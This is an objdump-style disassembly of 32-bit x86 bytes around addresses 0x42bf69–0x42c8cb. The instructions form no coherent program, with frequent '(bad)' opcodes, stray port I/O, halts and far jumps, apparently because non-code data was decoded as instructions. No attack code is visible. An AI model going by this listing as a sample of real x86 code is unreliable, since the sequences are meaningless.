  42bf69:	jle    0x42bf88
  42bf6b:	aad    0x8f
  42bf6d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  42bf6f:	dec    ebp
  42bf70:	jle    0x42bf13
  42bf72:	inc    ebp
  42bf73:	sub    ah,BYTE PTR [edx+esi*1-0x7c52b1ac]
  42bf7a:	and    BYTE PTR [esi+0x16780074],0xcd
  42bf81:	or     BYTE PTR [ecx-0x10a98508],bh
  42bf87:	sar    DWORD PTR [ebp+0x16],0xf5
  42bf8b:	fistp  WORD PTR ds:0xa6d5b49
  42bf91:	aaa    
  42bf92:	cdq    
  42bf93:	in     al,dx
  42bf94:	pop    ecx
  42bf95:	(bad)  
  42bf97:	mov    edi,0x1e3dbb3f
  42bf9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf9d:	ins    BYTE PTR es:[edi],dx
  42bf9e:	repnz cmp cl,BYTE PTR [eax-0x77]
  42bfa2:	not    edi
  42bfa4:	push   ss
  42bfa5:	imul   esi,esp,0x47652eae
  42bfab:	(bad)  
  42bfac:	mov    ss,WORD PTR [eax+0x50]
  42bfaf:	xlat   BYTE PTR ds:[ebx]
  42bfb0:	mov    ebx,0xf28ca66c
  42bfb5:	xchg   esp,eax
  42bfb6:	popf   
  42bfb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bfb8:	dec    eax
  42bfb9:	loope  0x42bf8b
  42bfbb:	retf   0x95cd
  42bfbe:	popf   
  42bfbf:	pop    ecx
  42bfc0:	lods   al,BYTE PTR ds:[esi]
  42bfc1:	xlat   BYTE PTR ds:[ebx]
  42bfc2:	inc    esi
  42bfc3:	je     0x42bf74
  42bfc5:	dec    ebx
  42bfc6:	jge    0x42c02e
  42bfc8:	int3   
  42bfc9:	sbb    BYTE PTR [eax],bl
  42bfcb:	ret    0x1eac
  42bfce:	adc    edx,DWORD PTR [edi]
  42bfd0:	mov    esp,0xe2af94f7
  42bfd5:	data16 mov bh,0xe1
  42bfd8:	dec    ebp
  42bfd9:	pusha  
  42bfda:	pushf  
  42bfdb:	adc    DWORD PTR [edi+0x50],esi
  42bfde:	sbb    BYTE PTR [edi],ah
  42bfe0:	loopne 0x42bff1
  42bfe2:	pop    ss
  42bfe3:	and    edx,DWORD PTR cs:[edi-0x2b2317d]
  42bfea:	js     0x42bf8d
  42bfec:	dec    ebp
  42bfed:	out    dx,al
  42bfee:	into   
  42bfef:	xchg   edx,eax
  42bff0:	inc    eax
  42bff1:	pop    ds
  42bff2:	addr16 fsubr st,st(5)
  42bff5:	mov    eax,0x5ff2cfe6
  42bffa:	sbb    ecx,DWORD PTR [ebx+0x3f]
  42bffd:	adc    al,0x5f
  42bfff:	inc    ecx
  42c000:	in     al,dx
  42c001:	or     eax,0xa0fe309e
  42c006:	leave  
  42c007:	lock dec bx
  42c00a:	in     al,dx
  42c00b:	or     dh,0xb5
  42c00e:	ror    BYTE PTR ds:0x0,0x0
	...
  42c071:	add    BYTE PTR [eax],al
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	rcr    bl,0xfa
  42c083:	mov    edx,0x1d6e0
  42c088:	add    al,0x1
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	out    0x9c,eax
  42c08e:	mov    ds:0xef2b5b05,eax
  42c093:	mov    ebp,0x80bc9915
  42c098:	sbb    eax,0x2dbd159
  42c09d:	popa   
  42c09e:	jns    0x42c031
  42c0a0:	and    eax,0x302f5ef1
  42c0a5:	xchg   ecx,eax
  42c0a6:	lea    esi,[ebx+esi*2+0x23]
  42c0aa:	pop    ss
  42c0ab:	and    al,0x68
  42c0ad:	pushf  
  42c0ae:	mov    edi,0xc00fe795
  42c0b3:	fstp   QWORD PTR [edi]
  42c0b5:	loopne 0x42c05c
  42c0b7:	or     al,0x7e
  42c0b9:	std    
  42c0ba:	test   ebp,ecx
  42c0bc:	faddp  st(0),st
  42c0be:	fs inc ecx
  42c0c0:	mov    edi,DWORD PTR [ebp+0x14]
  42c0c3:	out    dx,al
  42c0c4:	mov    bl,0x63
  42c0c6:	add    BYTE PTR [eax],ah
  42c0c8:	mov    al,ds:0x568a821a
  42c0cd:	test   BYTE PTR [eax+esi*8],ah
  42c0d0:	add    ecx,DWORD PTR [edx-0x726da076]
  42c0d6:	shl    esi,cl
  42c0d8:	loopne 0x42c138
  42c0da:	jne    0x42c123
  42c0dc:	adc    BYTE PTR [ebx+ebx*2-0x6c8aabe5],ch
  42c0e3:	sar    BYTE PTR ds:0xc7b2c3be,cl
  42c0e9:	cmp    eax,0x5aba1423
  42c0ee:	push   cs
  42c0ef:	push   ebp
  42c0f0:	test   al,0x47
  42c0f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c0f3:	mov    edi,ds
  42c0f5:	mov    ds:0x2a8657a,eax
  42c0fa:	mov    ebp,DWORD PTR ss:[ebx+0x70]
  42c0fe:	mov    WORD PTR cs:[esi-0x70],gs
  42c102:	data16 loop 0x42c0f6
  42c105:	adc    BYTE PTR [edi-0x6],cl
  42c108:	cmp    al,al
  42c10a:	push   ebx
  42c10b:	xor    BYTE PTR [ebp+0x3f636a99],0xfb
  42c112:	mov    ebp,0xe35740e5
  42c117:	jno    0x42c10b
  42c119:	cld    
  42c11a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c11b:	mov    bl,0x72
  42c11d:	imul   ebp,DWORD PTR [esi+0x33],0xffffff82
  42c121:	or     BYTE PTR [edx-0x4f],ah
  42c124:	lds    ebx,FWORD PTR [esi]
  42c126:	test   DWORD PTR [ecx-0xe],0x2aa39412
  42c12d:	sub    eax,0xb109bf6f
  42c132:	add    dh,BYTE PTR [ecx]
  42c134:	and    esi,edi
  42c136:	lods   al,BYTE PTR ds:[esi]
  42c137:	and    dh,al
  42c139:	inc    ebx
  42c13a:	add    al,0x67
  42c13c:	add    al,0x75
  42c13e:	icebp  
  42c13f:	into   
  42c140:	xor    eax,0xa675aa66
  42c145:	push   ecx
  42c146:	pop    edi
  42c147:	ja     0x42c0ce
  42c149:	fcomi  st,st(5)
  42c14b:	aas    
  42c14c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c14d:	mov    cl,0x5c
  42c14f:	aaa    
  42c150:	test   al,0x38
  42c152:	call   0x6ccb:0xeaf92669
  42c159:	jb     0x42c121
  42c15b:	or     ch,BYTE PTR [esi]
  42c15d:	add    al,0x3e
  42c15f:	and    BYTE PTR [ecx+eiz*1],ah
  42c162:	add    DWORD PTR [eax-0x24],esi
  42c165:	dec    eax
  42c166:	stc    
  42c167:	sub    eax,DWORD PTR [ebx]
  42c169:	inc    eax
  42c16a:	mov    ebx,0xf4835bbd
  42c16f:	lods   al,BYTE PTR ds:[esi]
  42c170:	call   0xad773c5d
  42c175:	fist   WORD PTR [ebp-0x47ef0768]
  42c17b:	shl    DWORD PTR [ecx],1
  42c17d:	push   ebp
  42c17e:	fisttp QWORD PTR [edi+ecx*2+0x64]
  42c182:	sbb    edi,ebx
  42c184:	(bad)  
  42c186:	out    0xce,eax
  42c188:	pusha  
  42c189:	fcmovu st,st(7)
  42c18b:	icebp  
  42c18c:	rol    ah,cl
  42c18e:	push   cs
  42c18f:	out    0x0,al
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	or     bh,BYTE PTR [edi]
  42c202:	dec    ebx
  42c203:	sbb    esp,esp
  42c205:	xlat   BYTE PTR ds:[ebx]
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    al,0x1
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	and    bh,BYTE PTR [esi]
  42c20e:	enter  0xb148,0x9b
  42c212:	push   edi
  42c213:	pop    esi
  42c214:	cmp    ch,al
  42c216:	fsubr  DWORD PTR [edi*1-0x72a5ea1f]
  42c21d:	jae    0x42c241
  42c21f:	cdq    
  42c220:	lods   al,BYTE PTR ds:[esi]
  42c221:	hlt    
  42c222:	mov    edx,0x668e93c8
  42c227:	adc    dh,BYTE PTR fs:[esi+0x5f5b04b4]
  42c22e:	jns    0x42c276
  42c230:	xor    eax,0xcc16c0a6
  42c235:	mov    eax,0xf6285dc4
  42c23a:	mov    dh,0x6a
  42c23c:	clc    
  42c23d:	and    DWORD PTR [eiz*4+0x6055ff33],0xffffff80
  42c245:	adc    eax,0xa444563e
  42c24a:	mov    ah,0x9b
  42c24c:	pop    ebp
  42c24d:	xchg   esp,eax
  42c24e:	and    cl,bl
  42c250:	stc    
  42c251:	sti    
  42c252:	aam    0xbb
  42c254:	out    0xfc,eax
  42c256:	push   ebx
  42c257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c258:	mov    DWORD PTR [esi],ecx
  42c25a:	rep outs dx,BYTE PTR ds:[esi]
  42c25c:	(bad)  
  42c25d:	out    0x94,eax
  42c25f:	les    esp,FWORD PTR [ecx+0x42]
  42c262:	test   BYTE PTR ds:0xb81d280f,al
  42c268:	add    DWORD PTR [edx],ecx
  42c26a:	or     ebx,ecx
  42c26c:	pushf  
  42c26d:	repnz rcl DWORD PTR [edx+0x4b6ad135],cl
  42c274:	fs push di
  42c277:	leave  
  42c278:	add    eax,0x5461e458
  42c27d:	sbb    dh,cl
  42c27f:	nop
  42c280:	icebp  
  42c281:	lods   al,BYTE PTR ds:[esi]
  42c282:	lock ret 0xe027
  42c286:	jno    0x42c27c
  42c288:	ret    0xc5da
  42c28b:	adc    eax,0x328dc377
  42c290:	inc    esi
  42c291:	lods   eax,DWORD PTR ds:[esi]
  42c292:	xor    eax,0xd6fdbeb1
  42c297:	sbb    ecx,DWORD PTR ds:0x4c16e279
  42c29d:	loopne 0x42c30b
  42c29f:	xor    al,0x8a
  42c2a1:	dec    ebx
  42c2a2:	mov    dh,0x33
  42c2a4:	dec    esi
  42c2a5:	and    sp,WORD PTR [ecx]
  42c2a8:	push   ecx
  42c2a9:	pop    esi
  42c2aa:	inc    edx
  42c2ab:	mov    ch,0xdd
  42c2ad:	mov    edx,0xfa752027
  42c2b2:	jb     0x42c2a2
  42c2b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c2b5:	test   ch,cl
  42c2b7:	addr16 mov ebx,edi
  42c2ba:	out    dx,al
  42c2bb:	ffreep st(0)
  42c2bd:	cmp    esi,edi
  42c2bf:	(bad)  
  42c2c0:	mov    ds:0xe1f098ba,eax
  42c2c5:	jbe    0x42c272
  42c2c7:	push   0xffffffb4
  42c2c9:	fdiv   QWORD PTR [edi]
  42c2cb:	fsubr  DWORD PTR [eax]
  42c2cd:	adc    bh,BYTE PTR [ebp+ebx*4-0xf]
  42c2d1:	pcmpgtd mm0,QWORD PTR [ecx+ecx*4]
  42c2d5:	test   DWORD PTR [edi],edx
  42c2d7:	xchg   ecx,eax
  42c2d8:	xor    esi,DWORD PTR [esi-0x11d30a7a]
  42c2de:	mov    edi,0xbd124b90
  42c2e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2e4:	hlt    
  42c2e5:	jne    0x42c291
  42c2e7:	ss loop 0x42c313
  42c2ea:	pusha  
  42c2eb:	xchg   ebx,eax
  42c2ec:	add    ah,BYTE PTR [ebx-0x55394973]
  42c2f2:	cmc    
  42c2f3:	lea    ebx,[edx-0x6ab6b27]
  42c2f9:	xor    BYTE PTR [edi],dh
  42c2fb:	mov    eax,ds:0xc1b79f7f
  42c300:	mov    WORD PTR [ecx],gs
  42c302:	jae    0x42c357
  42c304:	adc    BYTE PTR [ecx+0x79],bh
  42c307:	int    0x7c
  42c309:	add    al,0xf8
  42c30b:	dec    esp
  42c30c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c30d:	inc    eax
  42c30e:	repz push eax
	...
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xe01841f6
  42c383:	and    ch,al
  42c385:	fadd   DWORD PTR [ecx]
  42c387:	add    BYTE PTR [ecx+eax*1],al
  42c38a:	add    BYTE PTR [eax],al
  42c38c:	popf   
  42c38d:	bound  esi,QWORD PTR [eax]
  42c38f:	ret    
  42c390:	ret    0x388e
  42c393:	jmp    0xcaa4fa3d
  42c398:	lods   al,BYTE PTR ds:[esi]
  42c399:	or     eax,0x2ff3d44
  42c39e:	aaa    
  42c39f:	popf   
  42c3a0:	or     al,0xfa
  42c3a2:	cld    
  42c3a3:	out    0x5e,al
  42c3a5:	cmp    BYTE PTR [eax+0x72ad891b],0xb9
  42c3ac:	shr    BYTE PTR [eax],0x4c
  42c3af:	scas   al,BYTE PTR es:[edi]
  42c3b0:	stos   BYTE PTR es:[edi],al
  42c3b1:	into   
  42c3b2:	push   edi
  42c3b3:	sub    DWORD PTR [esi],edi
  42c3b5:	loopne 0x42c3da
  42c3b7:	jmp    0x8dca:0x626c2925
  42c3be:	ss xor ah,ah
  42c3c1:	inc    edi
  42c3c2:	and    ah,BYTE PTR [eax-0x28]
  42c3c5:	(bad)  
  42c3c6:	and    al,0x14
  42c3c8:	hlt    
  42c3c9:	pop    eax
  42c3ca:	pop    edx
  42c3cb:	sahf   
  42c3cc:	popa   
  42c3cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c3ce:	and    ebp,DWORD PTR [edi-0x36abdf3e]
  42c3d4:	out    0xbc,al
  42c3d6:	or     DWORD PTR [ebx],ebx
  42c3d8:	push   0xfffffff5
  42c3da:	xchg   edi,eax
  42c3db:	push   ebp
  42c3dc:	push   cs
  42c3dd:	add    dl,ch
  42c3df:	scas   eax,DWORD PTR es:[edi]
  42c3e0:	sti    
  42c3e1:	add    eax,edx
  42c3e3:	and    al,0x80
  42c3e5:	cmp    eax,0xa50500d8
  42c3ea:	adc    al,bh
  42c3ec:	(bad)  
  42c3ed:	fldcw  WORD PTR [eax+0x58]
  42c3f0:	dec    ebx
  42c3f1:	popf   
  42c3f2:	xor    eax,0x8fbf5ba1
  42c3f7:	stos   BYTE PTR es:[edi],al
  42c3f8:	pop    esi
  42c3f9:	mov    edi,0x87788780
  42c3fe:	rol    BYTE PTR [edx-0x30211acc],1
  42c404:	dec    esi
  42c405:	popf   
  42c406:	dec    ebp
  42c407:	pop    ebp
  42c408:	scas   eax,DWORD PTR es:[edi]
  42c409:	adc    ecx,DWORD PTR [esp+eiz*8]
  42c40c:	retf   
  42c40d:	xchg   esi,eax
  42c40e:	imul   edi,edi,0xfffffff2
  42c411:	mov    ch,0x46
  42c413:	(bad)  
  42c414:	ds dec edx
  42c416:	ss jae 0x42c416
  42c419:	cli    
  42c41a:	out    dx,al
  42c41b:	xchg   ebp,eax
  42c41c:	data16 xor ch,BYTE PTR [ebx-0x68]
  42c420:	xor    DWORD PTR [edi],esp
  42c422:	das    
  42c423:	mov    cs,WORD PTR [edi]
  42c425:	imul   ebp,DWORD PTR [edi+ebp*4-0xd8adbd1],0x7c
  42c42d:	retf   0xbc9d
  42c430:	xor    eax,0x2454f410
  42c435:	rol    BYTE PTR [esi],cl
  42c437:	jecxz  0x42c43b
  42c439:	mov    ch,0xa8
  42c43b:	mov    al,0x14
  42c43d:	xchg   ah,bl
  42c43f:	retf   
  42c440:	push   edi
  42c441:	stc    
  42c442:	fisubr DWORD PTR ds:0x8612989a
  42c448:	clc    
  42c449:	hlt    
  42c44a:	xor    DWORD PTR [ebx-0x1a94cc59],ebx
  42c450:	jne    0x42c404
  42c452:	mov    al,0x50
  42c454:	xor    al,BYTE PTR [ecx-0x4b]
  42c457:	fnstsw WORD PTR [bx-0x20]
  42c45b:	adc    BYTE PTR [ebx-0x72c7ea80],ch
  42c461:	out    0x8d,al
  42c463:	out    0x6e,eax
  42c465:	hlt    
  42c466:	jp     0x42c400
  42c468:	dec    edi
  42c469:	sbb    ah,cl
  42c46b:	sub    al,0xc3
  42c46d:	call   0xf357:0x2543f378
  42c474:	mov    bl,BYTE PTR [ecx-0x17]
  42c477:	push   ss
  42c478:	cs (bad) 
  42c47a:	or     esp,DWORD PTR [ebp+0x1f]
  42c47d:	pop    ss
  42c47e:	mov    BYTE PTR [eax+0x69],bl
  42c481:	pusha  
  42c482:	sub    DWORD PTR [edx+0x29184e0a],esi
  42c488:	sub    ecx,edx
  42c48a:	dec    ebp
  42c48b:	into   
  42c48c:	hlt    
  42c48d:	xchg   ebx,eax
  42c48e:	inc    DWORD PTR fs:[eax]
	...
  42c4f1:	add    BYTE PTR [eax],al
  42c4f3:	add    ah,ch
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x2834,0x44
  42c502:	repz lahf 
  42c504:	in     al,dx
  42c505:	fld    DWORD PTR [ecx]
  42c507:	add    BYTE PTR [ecx+eax*1],al
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	arpl   WORD PTR [edx+0x3e],sp
  42c50f:	push   es
  42c510:	inc    ebp
  42c511:	inc    ebx
  42c512:	mov    ds:0xba5fdce3,al
  42c517:	xor    ebp,0x2b698960
  42c51d:	lea    esp,[esi-0x54]
  42c520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c521:	jmp    0x71a3a247
  42c526:	ins    BYTE PTR es:[edi],dx
  42c527:	dec    esp
  42c528:	inc    eax
  42c529:	dec    esp
  42c52a:	sar    DWORD PTR [edi+0x880e5fc],1
  42c530:	sbb    BYTE PTR [ecx+edi*2-0x20433a4b],al
  42c537:	mov    esp,0x839714a1
  42c53c:	adc    eax,0x18c03d37
  42c541:	les    eax,FWORD PTR [esi]
  42c543:	xchg   al,cl
  42c545:	clc    
  42c546:	inc    edi
  42c547:	dec    BYTE PTR [eax]
  42c549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c54a:	mov    eax,0x76706583
  42c54f:	xor    BYTE PTR [edx],ch
  42c551:	shr    BYTE PTR [edx-0x65],0xc6
  42c555:	fs mov bl,0xee
  42c558:	sub    eax,0xee8bd013
  42c55d:	mov    dl,0x82
  42c55f:	into   
  42c560:	mov    dl,0xc5
  42c562:	jle    0x42c5bd
  42c564:	pop    ds
  42c565:	(bad)  
  42c566:	sar    BYTE PTR [ebp-0x71c9f1bc],0xa3
  42c56d:	push   ss
  42c56e:	mov    edx,0xfb4cd63f
  42c573:	and    al,0x25
  42c575:	out    0xf2,eax
  42c577:	cs in  eax,0x50
  42c57a:	ds jmp 0x44a0:0xb592155a
  42c582:	inc    DWORD PTR [ecx+0x36]
  42c585:	test   eax,0xf8bb2ee0
  42c58a:	xchg   edx,eax
  42c58b:	repnz mov edi,0x26b94216
  42c591:	into   
  42c592:	mov    BYTE PTR [esi],dl
  42c594:	cmc    
  42c595:	xchg   DWORD PTR [edx],esi
  42c597:	into   
  42c598:	fwait
  42c599:	pop    edx
  42c59b:	add    ch,BYTE PTR [ebx]
  42c59d:	fild   WORD PTR [edx]
  42c59f:	leave  
  42c5a0:	cld    
  42c5a1:	add    al,0xcb
  42c5a3:	cmp    DWORD PTR [ebx+ebp*2-0x3023184f],esp
  42c5aa:	or     bl,BYTE PTR [eax]
  42c5ac:	jle    0x42c58b
  42c5ae:	cmp    ebx,DWORD PTR [ebp-0x17bd2dc]
  42c5b4:	gs repnz test al,0xee
  42c5b8:	gs pop es
  42c5ba:	sahf   
  42c5bb:	jo     0x42c563
  42c5bd:	test   BYTE PTR [edx],bl
  42c5bf:	pop    ds
  42c5c0:	cwde   
  42c5c1:	out    dx,eax
  42c5c2:	aam    0x98
  42c5c4:	dec    ecx
  42c5c5:	mov    edi,edx
  42c5c7:	fisubr DWORD PTR [ecx]
  42c5c9:	or     ebp,ebp
  42c5cb:	jnp    0x42c561
  42c5cd:	push   ds
  42c5ce:	mov    eax,0xb1615466
  42c5d3:	neg    BYTE PTR [eax]
  42c5d5:	add    DWORD PTR [ebx],ebp
  42c5d7:	in     eax,dx
  42c5d8:	sub    DWORD PTR ss:[ebp-0x4bbf4575],edi
  42c5df:	jge    0x42c5c4
  42c5e1:	and    DWORD PTR [esi+edi*8-0x3891256d],eax
  42c5e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5e9:	in     eax,0x95
  42c5eb:	sub    edx,DWORD PTR [ecx]
  42c5ed:	loope  0x42c589
  42c5ef:	cmp    al,0x87
  42c5f1:	fnstcw WORD PTR [ebp-0x4d]
  42c5f4:	(bad)  
  42c5f5:	scas   al,BYTE PTR es:[edi]
  42c5f6:	fwait
  42c5f7:	popf   
  42c5f8:	cmp    al,0x2d
  42c5fa:	adc    eax,0x29c3b0cd
  42c5ff:	xor    al,BYTE PTR [ecx+0x9dd1716]
  42c605:	dec    ecx
  42c606:	push   ecx
  42c607:	cmp    al,0x96
  42c609:	sbb    esi,DWORD PTR ds:0xf56b4ecd
  42c60f:	ret    0x0
	...
  42c672:	add    BYTE PTR [eax],al
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0xa920395]
  42c681:	xchg   edi,eax
  42c682:	sahf   
  42c683:	mov    dh,al
  42c685:	fiadd  DWORD PTR [ecx]
  42c687:	add    BYTE PTR [ecx+eax*1],al
  42c68a:	add    BYTE PTR [eax],al
  42c68c:	adc    ebp,esp
  42c68e:	stc    
  42c68f:	mov    edx,0xb9b19c5d
  42c694:	cmp    al,0xcb
  42c696:	sbb    BYTE PTR [ecx],0xad
  42c699:	xchg   cl,ah
  42c69b:	push   eax
  42c69c:	jmp    0xf787a58f
  42c6a1:	adc    DWORD PTR [ecx],edx
  42c6a3:	cmp    al,al
  42c6a5:	jmp    0x46b13673
  42c6aa:	jge    0x42c68b
  42c6ac:	lock ret 
  42c6ae:	cmp    eax,0xcb6fc6f
  42c6b3:	cmc    
  42c6b4:	sub    al,0xb7
  42c6b6:	jge    0x42c6f6
  42c6b8:	or     esi,DWORD PTR [edx+0x17]
  42c6bb:	adc    al,0x10
  42c6bd:	repnz pop ecx
  42c6bf:	clc    
  42c6c0:	retf   0xe217
  42c6c3:	pop    edx
  42c6c4:	idiv   DWORD PTR [eax-0x66]
  42c6c7:	add    esi,DWORD PTR [eax]
  42c6c9:	inc    esi
  42c6ca:	pushf  
  42c6cb:	out    dx,eax
  42c6cc:	aad    0xdd
  42c6ce:	fistp  DWORD PTR [ebp+0x5b]
  42c6d1:	lods   eax,DWORD PTR ds:[esi]
  42c6d2:	ret    
  42c6d3:	arpl   WORD PTR [ecx],sp
  42c6d5:	xor    eax,edx
  42c6d7:	sbb    al,0xe0
  42c6d9:	mov    ds,WORD PTR [edx-0x1a]
  42c6dc:	mov    DWORD PTR [eax],0xb9eb2706
  42c6e2:	int    0xee
  42c6e4:	and    BYTE PTR [edi-0x3c],al
  42c6e7:	cmp    bl,BYTE PTR [edx+0x9d58397]
  42c6ed:	div    DWORD PTR [edi]
  42c6ef:	cld    
  42c6f0:	je     0x42c6d2
  42c6f2:	into   
  42c6f3:	dec    esp
  42c6f4:	fdivr  DWORD PTR ds:[ecx+0x5b556edd]
  42c6fb:	mov    eax,0xdab089b0
  42c700:	add    DWORD PTR [esp+ebp*4],0xcd6653f4
  42c707:	pop    ebp
  42c708:	mov    al,ds:0xed5eafe8
  42c70d:	in     eax,0x77
  42c70f:	mov    ah,0x92
  42c711:	popf   
  42c712:	adc    ebp,DWORD PTR [ecx-0x5d423ea7]
  42c718:	and    al,0xf8
  42c71a:	bound  edi,QWORD PTR [edi+0x5c]
  42c71d:	stc    
  42c71e:	call   0xb39e7c8a
  42c723:	xor    al,0x96
  42c725:	xchg   edi,eax
  42c726:	mov    ah,0x83
  42c728:	loop   0x42c755
  42c72a:	cmp    ebx,DWORD PTR [edi+esi*1+0x78]
  42c72e:	mov    dl,0x4a
  42c730:	cs cwde 
  42c732:	xchg   BYTE PTR [eax],dh
  42c734:	mov    edx,0x9dcdd7eb
  42c739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c73a:	jb     0x42c6cc
  42c73c:	inc    edx
  42c73d:	sub    ebp,DWORD PTR [ecx]
  42c73f:	xor    al,0x5e
  42c741:	arpl   WORD PTR [eax+0x76],cx
  42c744:	mov    DWORD PTR [edx+0x6d],edx
  42c747:	ins    DWORD PTR es:[edi],dx
  42c748:	not    cl
  42c74a:	iret   
  42c74b:	and    DWORD PTR [edx-0x78],edx
  42c74e:	push   edi
  42c74f:	call   0x3366aa4b
  42c754:	and    dl,cl
  42c756:	xchg   ecx,eax
  42c757:	setns  BYTE PTR [ebp+0x1b]
  42c75b:	add    BYTE PTR [edx],dh
  42c75d:	push   eax
  42c75e:	push   ebx
  42c75f:	push   0xca2f325d
  42c764:	popf   
  42c765:	test   al,0xee
  42c767:	adc    BYTE PTR [edi+0x3b],0x60
  42c76b:	icebp  
  42c76c:	in     al,0x5
  42c76e:	jl     0x42c7b4
  42c770:	scas   al,BYTE PTR es:[edi]
  42c771:	xor    DWORD PTR [esp+edi*4],edx
  42c774:	popf   
  42c775:	popa   
  42c776:	xchg   esp,eax
  42c777:	and    DWORD PTR [ebx+0x69d1a529],ebx
  42c77d:	dec    DWORD PTR [ebx-0x2e]
  42c780:	push   esp
  42c781:	and    DWORD PTR ds:0x18d8f9b8,eax
  42c787:	pop    es
  42c788:	dec    ebp
  42c789:	fcom   DWORD PTR [esi]
  42c78b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c78c:	retf   
  42c78d:	je     0x42c7e2
  42c78f:	push   edi
	...
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c800:	das    
  42c801:	xor    BYTE PTR [eax+0x1dbf4dc],bl
  42c807:	add    BYTE PTR [ecx+eax*1],al
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	iret   
  42c80d:	mov    al,0x2d
  42c80f:	cmp    ebp,edi
  42c811:	mov    ebp,0xba195036
  42c816:	jmp    0x3cb:0xb886f9e1
  42c81d:	cmp    eax,0x74a9a101
  42c822:	pop    ebp
  42c823:	dec    ecx
  42c824:	mov    ecx,0xeaa6f145
  42c829:	pop    eax
  42c82a:	sbb    al,0xa0
  42c82c:	mov    ecx,0xa2f4380b
  42c831:	push   0x2d
  42c833:	jmp    0xdfd6936b
  42c838:	out    dx,eax
  42c839:	jae    0x42c7ed
  42c83b:	data16 xor ch,dl
  42c83e:	lds    ebp,FWORD PTR [eax]
  42c840:	inc    ebx
  42c841:	dec    esi
  42c842:	inc    esi
  42c843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c844:	pop    ss
  42c845:	mov    dh,0xd3
  42c847:	cwde   
  42c848:	mov    ds:0xacfedbcf,eax
  42c84d:	pop    eax
  42c84e:	jg     0x42c7f8
  42c850:	push   esp
  42c851:	out    dx,eax
  42c852:	in     al,dx
  42c853:	jb     0x42c87a
  42c855:	mov    dl,BYTE PTR [esi+eiz*2-0x1a2fcdd7]
  42c85c:	mov    ch,0x18
  42c85e:	dec    esp
  42c85f:	test   DWORD PTR [edi+0x24c474aa],edx
  42c865:	jne    0x42c846
  42c867:	sub    al,0xad
  42c869:	es jae 0x42c7fb
  42c86c:	scas   eax,DWORD PTR es:[edi]
  42c86d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c86e:	sti    
  42c86f:	lods   al,BYTE PTR ds:[esi]
  42c870:	pop    ds
  42c871:	mov    BYTE PTR [esi-0x11],dh
  42c874:	leave  
  42c875:	push   edx
  42c876:	cli    
  42c877:	mov    bh,0xe6
  42c879:	jbe    0x42c864
  42c87b:	daa    
  42c87c:	xchg   esp,eax
  42c87d:	push   ss
  42c87e:	or     BYTE PTR [ecx+0x3],al
  42c881:	dec    eax
  42c882:	xchg   ebp,eax
  42c883:	fmul   DWORD PTR [esi+0x61696622]
  42c889:	jg     0x42c8f3
  42c88b:	retf   0xdca1
  42c88e:	int    0xb2
  42c890:	loopne 0x42c87a
  42c892:	push   edi
  42c893:	dec    esp
  42c894:	xchg   esi,eax
  42c895:	lods   eax,DWORD PTR ds:[esi]
  42c896:	repnz rol BYTE PTR [ebx-0x272f90fa],0xd1
  42c89e:	arpl   WORD PTR [ecx+0x58],dx
  42c8a1:	cmp    DWORD PTR [edi],edi
  42c8a3:	mov    BYTE PTR [eax+0x1351546e],cl
  42c8a9:	mov    ebp,0x730fccfb
  42c8ae:	hlt    
  42c8af:	loopne 0x42c8e8
  42c8b1:	xchg   ebx,eax
  42c8b2:	cwde   
  42c8b3:	fadd   DWORD PTR [ebx+0x4ff96984]
  42c8b9:	sub    al,0x62
  42c8bb:	cmc    
  42c8bc:	pop    edx
  42c8bd:	xchg   ebx,eax
  42c8be:	mov    bl,0x5b
  42c8c0:	test   bl,ah
  42c8c2:	xor    BYTE PTR [eax],dh
  42c8c4:	mov    bl,0xd5
  42c8c6:	(bad)  
  42c8c7:	cwde   
  42c8c8:	hlt    
  42c8c9:	popa   
  42c8ca:	das    
  42c8cb:	cmp    dh,BYTE PTR [edi]
